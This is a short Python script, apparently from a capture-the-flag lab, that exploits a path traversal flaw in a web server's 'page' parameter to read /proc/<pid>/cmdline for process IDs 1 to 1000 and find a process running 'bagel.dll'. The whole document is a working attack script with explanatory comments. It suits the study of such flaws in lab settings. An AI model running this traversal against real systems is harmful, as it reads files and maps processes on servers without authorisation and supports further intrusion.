import requests

# Import the requests module for sending HTTP requests

dll_name = "bagel.dll"

# Specify the name of the DLL file to search for

for i in range(1, 1001):
    url = f"http://10.10.11.201:8000/?page=../../../../proc/{i}/cmdline"
    # Construct the URL with the process ID to access the cmdline file
    
    response = requests.get(url)
    # Send an HTTP GET request to the URL
    
    cmdline = response.text
    # Extract the response content, representing the command line arguments
    
    if dll_name in cmdline:
        # Check if the DLL name exists in the command line arguments
        print(f"DLL found: Process {i}")
        print(f"Command line: {cmdline}")
        # Print the DLL found and associated command line
        
    print(f"  PID => {i}")
    # Print the process ID for each iteration
